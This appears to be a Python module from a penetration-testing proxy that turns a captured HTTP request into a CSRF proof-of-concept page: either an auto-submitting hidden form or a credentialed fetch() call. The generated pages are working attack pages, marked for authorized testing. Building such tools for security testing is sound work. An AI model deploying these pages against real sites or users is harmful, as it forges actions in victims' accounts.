"""Generate a CSRF proof-of-concept HTML page from a request."""
from __future__ import annotations
import html
from urllib.parse import urlparse, parse_qsl

from . import httptext


def _esc(s: str) -> str:
    return html.escape(s, quote=True)


def build_poc(request_text: str, url: str) -> str:
    """Build a self-submitting CSRF PoC for the given request.

    - urlencoded / GET  -> an auto-submitting HTML form
    - JSON / other      -> a fetch()-based PoC (note: subject to CORS/preflight)
    """
    start, headers, body = httptext.split_message(request_text)
    parts = start.split(" ")
    method = (parts[0] if parts else "GET").upper()
    ctype = ""
    for k, v in headers:
        if k.lower() == "content-type":
            ctype = v.lower()
            break

    if method == "GET":
        q = parse_qsl(urlparse(url).query, keep_blank_values=True)
        return _form_poc(url.split("?")[0], "GET", q)

    if "application/x-www-form-urlencoded" in ctype or (body and "=" in body and "{" not in body):
        fields = parse_qsl(body, keep_blank_values=True)
        return _form_poc(url, "POST", fields)

    # JSON / raw body -> fetch PoC
    return _fetch_poc(method, url, ctype or "text/plain", body)


def _form_poc(action, method, fields):
    inputs = "\n".join(
        f'    <input type="hidden" name="{_esc(k)}" value="{_esc(v)}">'
        for k, v in fields)
    return f"""<!DOCTYPE html>
<html>
  <!-- r3dProxy CSRF PoC — for authorized testing only -->
  <body onload="document.forms[0].submit()">
    <form action="{_esc(action)}" method="{method}">
{inputs}
    </form>
  </body>
</html>
"""


def _fetch_poc(method, url, ctype, body):
    body_js = body.replace("\\", "\\\\").replace("`", "\\`")
    return f"""<!DOCTYPE html>
<html>
  <!-- r3dProxy CSRF PoC (fetch) — for authorized testing only.
       Note: cross-origin JSON requests are subject to CORS/preflight;
       this works where the endpoint allows it (e.g. simple requests
       or permissive CORS). -->
  <body>
    <script>
      fetch({_js(url)}, {{
        method: {_js(method)},
        headers: {{ "Content-Type": {_js(ctype)} }},
        body: `{body_js}`,
        credentials: "include",
        mode: "cors"
      }});
    </script>
  </body>
</html>
"""


def _js(s: str) -> str:
    return '"' + (s or "").replace("\\", "\\\\").replace('"', '\\"') + '"'
